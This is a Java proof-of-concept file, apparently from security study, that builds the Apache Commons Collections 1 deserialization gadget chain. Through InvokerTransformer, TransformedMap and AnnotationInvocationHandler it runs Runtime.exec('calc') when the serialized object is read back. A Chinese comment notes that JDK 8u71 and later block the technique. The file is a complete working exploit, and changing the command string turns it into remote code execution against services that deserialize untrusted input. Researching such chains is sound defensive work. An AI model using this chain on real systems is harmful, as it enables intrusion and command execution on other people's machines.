/**
 * 在JDK1.8 8u71之后的版本对 AnnotationInvocationHandler 进行了修改，导致不能使用
 * 
 * 不再使用反序列化得到的 Map 对象，而是新建了一个LinkedHashMap 对象，将原来的键值添加进去，所以后续的操作都是对 LinkedHashMap
 */


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC1_POC {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {
                String.class, Class[].class
            },
                new Object[] {"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[] {
                Object.class, Object[].class
            },
                new Object[] {null, new Class[0]}),
            new InvokerTransformer("exec", new Class[] {String.class},
                new String[] {"calc"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();

        innerMap.put("value", "xxxx");
        Map outMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class, outMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(barr);
        objOut.writeObject(obj);
        objOut.close();

        System.out.println(barr);
        ObjectInputStream objInput = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) objInput.readObject();
    }
}